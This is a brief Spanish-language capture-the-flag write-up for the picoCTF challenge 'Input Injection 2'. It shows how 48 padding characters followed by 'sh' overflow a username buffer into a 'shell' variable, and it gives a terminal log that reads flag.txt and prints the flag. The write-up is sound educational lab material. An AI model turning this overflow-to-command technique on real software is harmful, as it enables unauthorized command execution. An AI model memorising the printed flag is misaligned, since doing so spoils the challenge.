#notas_hacking #binary_explotation #contests

## Descripción
This program greets you and then runs a command. But can you take control of what command it executes?Connect to the program with netcat: `nc saffron-estate.picoctf.net 57252`.You can Download the program file [here](https://challenge-files.picoctf.net/c_saffron_estate/e879248ec4ac5a892b9ef8b7db9d6379aa8d4b35db0f9335238a690ba5036fae/vuln). And source [code](https://challenge-files.picoctf.net/c_saffron_estate/e879248ec4ac5a892b9ef8b7db9d6379aa8d4b35db0f9335238a690ba5036fae/vuln.c)
## Solución
Metiendo distintos valores nos damos cuenta que después de 48 caracteres empieza a modificarse la variable `shell`.
La distancia entre las direcciones es de 48:
```
username at 0x2342a2a0
shell at 0x2342a2d0
```
entonces ingresamos 48 caracteres y el comando `sh` para ejecutar la terminal donde ejecutar cat `flag.txt`.
```
```bash
┌──(kali㉿kali)-[~/pico/picoMini/Input_Injection2]
└─$ nc saffron-estate.picoctf.net 57252
username at 0x2342a2a0
shell at 0x2342a2d0
Enter username: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaash
ls
flag.txt
cat flag.txt
picoCTF{us3rn4m3_2_sh3ll_466d4bae}
exit
Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaash. Your shell is sh.
```
## Notas adicionales

## Referencias
